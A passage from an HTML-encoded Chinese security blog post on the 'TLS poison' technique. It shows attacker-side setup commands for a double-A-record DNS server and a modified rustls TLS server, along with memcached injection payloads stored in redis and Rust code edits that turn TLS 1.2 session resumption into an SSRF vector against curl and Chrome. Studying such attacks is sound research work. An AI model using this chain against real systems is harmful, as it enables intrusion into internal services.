&#x7B2C;&#x4E00;&#x6B21;&#x5EFA;&#x7ACB;&#x94FE;&#x63A5;&#xFF0C;&#x62FF;&#x5230;&#x6211;&#x4EEC;&#x5206;&#x914D;&#x7684; payload &#x540E;&#xFF0C;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#xFF0C;&#x8BA9;&#x5176;&#x7B2C;&#x4E8C;&#x6B21;&#x8FDE;&#x63A5;&#x4E0D;&#x901A;&#x800C;&#x53BB;&#x9009;&#x62E9;&#x53E6;&#x5916;&#x4E00;&#x4E2A; IP &#x5462;&#xFF1F;</p><p>&#x4E8B;&#x5B9E;&#x8BF4;&#x660E;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x786E;&#x5B9E;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x505A;&#x3002;&#x57FA;&#x4E8E; @Ivan Komarov &#x63D0;&#x4F9B;&#x7684; DNS Server &#x4EE5;&#x53CA; @zhaojin &#x4F7F;&#x7528;&#x7684; proxy.py &#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x62C9;&#x53D6;&#x6211;&#x6574;&#x7406;&#x7684;&#x4ED3;&#x5E93; <a href="https://github.com/ZeddYu/TLS-poison" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison</a> &#x8FDB;&#x884C;&#x5B9E;&#x9A8C;&#x3002;</p><p>&#x8FD9;&#x91CC; DNS VPS &#x7684; setup &#x6211;&#x4EEC;&#x9700;&#x8981;&#x4F7F;&#x7528; client-hello-poisoning/new-custom-dns/alternate-dns.py &#x8FDB;&#x884C;&#x6211;&#x4EEC;&#x57DF;&#x540D;&#x7684;&#x89E3;&#x6790;&#xFF1A;</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">alternate-dns</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">tls</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">--ip</span> <span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">--mode</span> <span class="hljs-selector-tag">static_zero</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>x.x.x.x &#x4E3A;&#x4F60; TLS Server IP &#xFF0C;mode &#x6709;&#x4E24;&#x79CD;&#xFF0C;<code>rebinding</code>&#x6A21;&#x5F0F;&#x5219;&#x4E3A;&#x666E;&#x901A;&#x7684;&#x91CD;&#x7ED1;&#x5B9A;&#x89E3;&#x6790;&#x6A21;&#x5F0F;&#xFF0C;<code>static_zero</code>&#x5219;&#x662F;&#x6211;&#x4EEC;&#x8FD9;&#x6B21;&#x6D4B;&#x8BD5;&#x7684;&#x53CC; A &#x8BB0;&#x5F55;&#x3002;</p><p>TLS VPS &#x7684; setup &#x8FD8;&#x662F;&#x4E0E;&#x4E4B;&#x524D;&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x8FD9;&#x6B21;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x628A; TLS Server &#x7684;&#x7AEF;&#x53E3;&#x7ED1;&#x5B9A;&#x5728; 11210 &#x4E0A;&#xFF0C;&#x4F7F;&#x7528; proxy.py &#x5C06; 11211 &#x7684;&#x6D41;&#x91CF;&#x8F6C;&#x53D1;&#x5230; TLS Server &#x4E0A;&#xFF0C;&#x800C;&#x4E14;&#x8BE5;&#x8F6C;&#x53D1;&#x53EA;&#x8F6C;&#x53D1;&#x4E00;&#x6B21;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x9020;&#x6210; curl &#x7B2C;&#x4E8C;&#x6B21;&#x8FDE;&#x63A5;&#x5931;&#x8D25;&#xFF0C;&#x4E5F;&#x5C31;&#x80FD;&#x8BA9;&#x5176;&#x5207;&#x6362;&#x5230;&#x53E6;&#x4E00;&#x4E2A; IP &#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#x4E86;&#x3002;</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11210 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/root/tls/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/root/tls/privkey.pem</span> http</span><br></pre></td></tr></tbody></table></figure><p></p><p>Ok. Let&#x2019;s have a try.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/5.png" alt></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x91CC; curl &#x4E0D;&#x9700;&#x8981;&#x518D;&#x7ECF;&#x8FC7;&#x591A;&#x6B21;&#x91CD;&#x5B9A;&#x5411;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4E00;&#x6B21;&#x91CD;&#x5B9A;&#x5411;&#x5C31;&#x53EF;&#x4EE5;&#x7A33;&#x5B9A;&#x8FDB;&#x884C; SSRF &#xFF0C;&#x4E5F;&#x4E0D;&#x518D;&#x9700;&#x8981;&#x4F9D;&#x9760; DNS Rebinding &#x7684;&#x7A33;&#x5B9A;&#x6027;&#x4E86;&#x3002;</p><h3 id="Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-Ticket"><a href="#Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-Ticket" class="headerlink" title="Use The Optimization Method To Deal With TLS 1.2 Session Ticket"></a>Use The Optimization Method To Deal With TLS 1.2 Session Ticket</h3><p>&#x5C3D;&#x7BA1;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; TLS 1.3 PSK &#x8FDB;&#x884C; Session Resumption &#xFF0C;&#x4F46;&#x662F;&#x6839;&#x636E; <a href="https://caniuse.com/?search=tls%201.3" target="_blank" rel="noopener">https://caniuse.com/?search=tls%201.3</a> &#x7684;&#x6570;&#x636E;&#x663E;&#x793A;&#xFF0C;&#x76EE;&#x524D; TLS 1.3 &#x5168;&#x7403;&#x8986;&#x76D6;&#x7387;&#x4E3A; 91.12% &#xFF0C;&#x800C; TLS 1.2 &#x7684;&#x8986;&#x76D6;&#x7387;&#x4E3A; 98.4% &#xFF0C;&#x5E76;&#x4E14;&#x76EE;&#x524D;&#x6DD8;&#x5B9D;&#x3001;&#x767E;&#x5EA6;&#x7B49;&#x77E5;&#x540D;&#x4E3B;&#x7AD9;&#x5747;&#x8FD8;&#x6CA1;&#x6709;&#x5B8C;&#x5168;&#x652F;&#x6301; TLS 1.3 &#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x4E9B;&#x65F6;&#x5019;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x4F7F;&#x7528;TLS 1.2 &#xFF0C;&#x800C;&#x4F5C;&#x8005;&#x53C8;&#x5077;&#x4E86;&#x4E00;&#x70B9;&#x61D2;&#xFF0C;&#x6CA1;&#x6709;&#x5B9E;&#x73B0;&#x4EFB;&#x4F55; TLS 1.2 &#x76F8;&#x5173;&#x7684;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#xFF0C;&#x800C; @zhaojin &#x4F7F;&#x7528;&#x7684; <a href="https://github.com/tlsfuzzer/tlslite-ng" target="_blank" rel="noopener">tlslite-ng</a> &#x76EE;&#x524D;&#x8FD8;&#x5E76;&#x672A;&#x652F;&#x6301; TLS 1.2 &#x5F53;&#x4E2D;&#x7684; Session Ticket &#xFF0C;&#x800C;&#x53C8;&#x6B63;&#x597D;&#x4F5C;&#x8005;&#x4FEE;&#x6539;&#x7684; <a href="https://github.com/ctz/rustls" target="_blank" rel="noopener">rustls</a> &#x5B9E;&#x73B0;&#x7684;&#x529F;&#x80FD;&#x6BD4;&#x8F83;&#x5B8C;&#x5584;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x53EA;&#x80FD;&#x786C;&#x5934;&#x76AE;&#x521A;&#x4E86;&#x4E00;&#x6CE2; rust &#xFF0C;&#x4E3A;&#x539F;&#x4F5C;&#x8005;&#x7684; TLSServer &#x589E;&#x52A0;&#x4E86;&#x57FA;&#x4E8E; TLS 1.2 Session Ticket &#x7684;&#x4FEE;&#x6539;&#x529F;&#x80FD;&#x3002;</p><p>&#x4F9D;&#x65E7;&#x4F7F;&#x7528;&#x6211;&#x4FEE;&#x6539;&#x7684;&#x4ED3;&#x5E93; <a href="https://github.com/ZeddYu/TLS-poison" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison</a> &#xFF0C;&#x5BF9;&#x4E8E; DNS Server setup &#x8FD8;&#x662F;&#x4F7F;&#x7528;&#x4F18;&#x5316;&#x7684;&#x53CC; A &#x8BB0;&#x5F55;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x4E8E; TLS Server setup &#x6211;&#x4EEC;&#x9700;&#x8981;&#x6539;&#x53D8;&#x4E00;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11210 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/root/tls/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/root/tls/privkey.pem</span> <span class="hljs-params">--tickets</span> <span class="hljs-params">--protover</span> 1.2 http</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;&#x53C2;&#x6570;<code>--tickets</code>&#xFF0C;&#x5141;&#x8BB8; TLS Server &#x4F7F;&#x7528; Session Tickets &#x8FDB;&#x884C; Session Resumption &#xFF1B;&#x4F7F;&#x7528;<code>--protover 1.2</code>&#x53C2;&#x6570;&#xFF0C;&#x53EA;&#x5141;&#x8BB8; TLS Server &#x6700;&#x9AD8;&#x4F7F;&#x7528; TLS 1.2 &#x7248;&#x672C;&#x3002;&#x5E76;&#x5728; redis &#x8BBE;&#x7F6E; ticket_payload &#xFF0C;&#x8FD9;&#x4E2A;&#x4E0E;&#x4E4B;&#x524D;&#x8BBE;&#x7F6E;&#x7684; payload &#x503C;&#x4E00;&#x6837;&#xFF0C;&#x662F;&#x7528;&#x6765;&#x5BF9; memcached &#x8FDB;&#x884C;&#x5229;&#x7528;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x5C31;&#x533A;&#x522B;&#x4E8E;&#x4E4B;&#x524D;&#x968F;&#x4FBF;&#x8BBE;&#x7F6E;&#x4E00;&#x4E0B;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#xFF0C;&#x4F8B;&#x5982;<code>set ticket_payload &quot;\r\nset foo 0 0 41\nThis is a TLS 1.2 session ticket example.\r\n&quot;</code></p><p>&#x5BF9;&#x4E8E; Client &#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x518D;&#x4F7F;&#x7528; curl &#xFF0C;&#x56E0;&#x4E3A;&#x5176;&#x5E76;&#x6CA1;&#x6709;&#x5B9E;&#x73B0; Ticket Session &#x63D2;&#x4EF6;&#x2026;&#x6240;&#x4EE5;&#x6211;&#x9009;&#x7528;&#x4E86;&#x8001;&#x7248;&#x672C; Chrome 70.0.3538.77 for Ubuntu &#x8FDB;&#x884C;&#x5B66;&#x4E60;&#x3002;&#xFF08;&#x63D0;&#x9192;&#x8FD9;&#x91CC;&#x4E0D;&#x8981;&#x7528; Firefox &#xFF0C;&#x56E0;&#x4E3A;&#x4F5C;&#x8005;&#x5728; PDF &#x4E2D;&#x8868;&#x793A;&#x8FC7; Firefox &#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x201C;&#x7279;&#x6027;&#x201D;&#xFF09;</p><p>&#x4F9D;&#x65E7;&#x5728; TLS Server &#x4E0A;&#x4F7F;&#x7528; proxy.py &#xFF0C;&#x63A5;&#x7740;&#x786E;&#x5B9A;&#x51C6;&#x5907;&#x597D;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x672C;&#x5730;&#x6253;&#x5F00; chrome &#x8BBF;&#x95EE;&#x81EA;&#x5DF1; TLS Server &#x7684;&#x5730;&#x5740;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/6.png" alt></p><p>&#x56E0;&#x4E3A; Chrome &#x7684;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x673A;&#x5236;&#xFF0C;&#x4F7F;&#x7528; Chrome &#x6D4B;&#x8BD5;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x80FD;&#x50CF; curl &#x90A3;&#x6837;&#x4E00;&#x6B21;&#x5C31;&#x80FD;&#x6210;&#x529F;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6700;&#x597D;&#x4F7F;&#x628A; Chrome &#x7684; Keep local data only until you quit your browser &#x9009;&#x9879;&#x6253;&#x5F00;&#x4EE5;&#x53CA;&#x8BBE;&#x7F6E;&#x6BCF;&#x6B21;&#x6253;&#x5F00; Chrome &#x65F6;&#x5C31;&#x6253;&#x5F00;&#x6211;&#x4EEC;&#x7684; TLS Server &#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x6837;&#x5B9E;&#x9A8C;&#x5C31;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x4E86;&#xFF0C;&#x591A;&#x8BD5;&#x51E0;&#x6B21;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E0A;&#x56FE;&#x8FD9;&#x4E2A;&#x6548;&#x679C;&#x3002;</p><h3 id="Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-ID"><a href="#Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-ID" class="headerlink" title="Use The Optimization Method To Deal With TLS 1.2 Session ID"></a>Use The Optimization Method To Deal With TLS 1.2 Session ID</h3><p>&#x90A3;&#x8981;&#x662F;&#x9047;&#x5230;&#x53EA;&#x80FD;&#x7528; curl/libcurl &#xFF0C;&#x800C;&#x4E14; TLS 1.3 &#x53C8;&#x4E0D;&#x652F;&#x6301;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x90A3;&#x5C31;&#x53EA;&#x80FD;&#x901A;&#x8FC7; TLS 1.2 Session ID &#x6765;&#x5B9E;&#x73B0;&#x6211;&#x4EEC;&#x6CE8;&#x5165; payload &#x5B9E;&#x73B0; SSRF &#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x80FD;&#x505A;&#x7684;&#x5C31;&#x662F;&#x4F7F;&#x7528;&#x53CC; A &#x8BB0;&#x5F55;&#x7684;&#x65B9;&#x6CD5;&#x6765;&#x63D0;&#x9AD8;&#x653B;&#x51FB;&#x7A33;&#x5B9A;&#x6027;&#x3002;</p><p>&#x7531;&#x4E8E;&#x4F5C;&#x8005;&#x5199;&#x7684;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5BF9; TLS 1.2 &#x8FDB;&#x884C;&#x9002;&#x914D;&#xFF0C;&#x800C;&#x6211;&#x4E5F;&#x5E76;&#x4E0D;&#x719F;&#x6089; rust &#xFF0C;&#x53EA;&#x80FD;&#x52C9;&#x5F3A;&#x627E;&#x5230;&#x4F5C;&#x8005;&#x4EE3;&#x7801;&#x5E93;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5927;&#x6982;&#x5C31;&#x662F;&#x7531;&#x4E8E;&#x4F5C;&#x8005;&#x5728; main.rs#730 &#x5FAA;&#x73AF;&#x4E2D;&#x6BCF;&#x6B21;&#x90FD;&#x4F7F;&#x7528;&#x4E86;&#x65B0;&#x7684; config &#xFF0C;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#x6240;&#x793A;&#xFF1A;</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">loop</span> {</span><br><span class="line">  poll.poll(&amp;<span class="hljs-keyword">mut</span> events, <span class="hljs-literal">None</span>)</span><br><span class="line">  .unwrap();</span><br><span class="line"></span><br><span class="line">  config = make_config(&amp;args, session_id_generator.clone());</span><br><span class="line">  tlsserv.tls_config = config;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> events.iter() {</span><br><span class="line">    <span class="hljs-keyword">match</span> event.token() {</span><br><span class="line">      LISTENER =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> !tlsserv.accept(&amp;<span class="hljs-keyword">mut</span> poll) {</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      _ =&gt; tlsserv.conn_event(&amp;<span class="hljs-keyword">mut</span> poll, &amp;event)</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BFC;&#x81F4;&#x4E86;&#x5728; rustls/src/server/hs.rs#718 &#x4E2D;&#x6BCF;&#x6B21;&#x6839;&#x636E;<code>client_hello.session_id.get_encoding()</code>&#x90FD;&#x53D6;&#x4E0D;&#x5230;&#x5B58;&#x50A8;&#x7684; Session ID</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Perhaps resume?  If we received a ticket, the sessionid</span></span><br><span class="line"><span class="hljs-comment">// does not correspond to a real session.</span></span><br><span class="line"><span class="hljs-keyword">if</span> !client_hello.session_id.is_empty() &amp;&amp; !ticket_received {</span><br><span class="line">  <span class="hljs-keyword">let</span> maybe_resume = sess.config.session_storage</span><br><span class="line">  .get(&amp;client_hello.session_id.get_encoding())</span><br><span class="line">  .and_then(|x| persist::ServerSessionValue::read_bytes(&amp;x));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> can_resume(sess, &amp;<span class="hljs-keyword">self</span>.handshake, &amp;maybe_resume) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.start_resumption(sess,</span><br><span class="line">      client_hello, sni.as_ref(),</span><br><span class="line">      &amp;client_hello.session_id,</span><br><span class="line">      maybe_resume.unwrap());</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x628A; main.rs#734 &#x4EE5;&#x4E0B;&#x4E24;&#x884C;&#x8FDB;&#x884C;&#x6CE8;&#x91CA;&#x5373;&#x53EF;&#xFF1A;</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// config = make_config(&amp;args, session_id_generator.clone());</span></span><br><span class="line"><span class="hljs-comment">// tlsserv.tls_config = config;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x867D;&#x7136;&#x53EF;&#x4EE5; debug &#x627E;&#x5230;&#x95EE;&#x9898;&#x6240;&#x5728;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x80FD;&#x5B8C;&#x7F8E;&#x5730;&#x4FEE;&#x6B63;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x53EA;&#x80FD;&#x505A;&#x4E2A;&#x4E34;&#x65F6;&#x7684;&#x5904;&#x7406;&#x529E;&#x6CD5;&#x6765;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x800C;&#x4E14;&#x81EA;&#x5DF1;&#x65F6;&#x95F4;&#x7CBE;&#x529B;&#x5E76;&#x4E0D;&#x592A;&#x8DB3;&#x591F;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x679C;&#x6709;&#x540C;&#x5B66;&#x6709;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x529E;&#x6CD5;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x6B22;&#x8FCE;&#x63D0; PR &#x4FEE;&#x6B63;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF01;</p><p>&#x7136;&#x540E;&#x5728; redis &#x4E2D;&#x4FEE;&#x6539; payload &#x4E3A; 32 &#x5B57;&#x8282;&#x957F;&#x5EA6;&#xFF1A;<code>set payload &quot;\r\nset foo 0 0 13\nI am so poor.\r\n&quot;</code>&#x3002;&#x597D;&#x4E86;&#xFF0C;&#x90A3;&#x5C31;&#x8BA9;&#x6211;&#x4EEC;&#x6765;&#x8BD5;&#x4E00;&#x4E0B;&#x5427;&#xFF01;</p><p><img 